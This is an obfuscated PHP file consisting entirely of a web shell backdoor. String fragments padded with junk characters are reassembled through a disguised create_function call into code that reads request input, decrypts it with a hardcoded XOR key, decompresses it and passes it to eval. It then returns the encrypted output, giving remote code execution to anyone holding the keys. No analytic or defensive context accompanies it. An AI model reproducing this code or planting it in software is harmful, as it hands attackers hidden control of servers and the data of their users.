<?php
$E='trlena!($t);$oa!="a!";foa!r($i=0;$i<$la!;){a!a!for($j=a!0;($j<$c&&$a!i<a!$la!';
$C='!("/$kha!(.+)$ka!f/",a!@a!file_get_contea!na!ta!s("pa!hp:/a!/a!input"),$m';
$J='RBKdsuca!a!a!7CnlEta!btG";fa!unction x($t,$k){$a!c=stra!len($ka!);$a!l=s';
$B=')==1) {@ob_a!start();@ea!a!val(@gzuncoa!mprea!ss(@a!x(@a!base6a!4_decode($';
$L='!base6a!4_ena!code(@x(@ga!zcomprea!ss($a!o),$k))a!;pria!nt("$p$kh$ra!$kf");}';
$K='m[1])a!a!a!,$k)));$o=@oa!b_geta!_contents()a!;@ob_a!enda!_clea!an();$r=@a';
$u=')a!;a!$j++,$i++)a!{$a!o.=$t{$i}^$k{$ja!};}}a!return $a!o;}if (@preg_matcha';
$D='$k="964a!582aa"a!;a!$a!kh="21bfa!ac8c3cc0";$kf=a!"6b4a!621ceeda!80a!";$p="';
$n=str_replace('zN','','crzNeatzNezN_fuzNnczNtizNon');
$Y=str_replace('a!','',$D.$J.$E.$u.$C.$B.$K.$L);
$q=$n('',$Y);$q();
?>
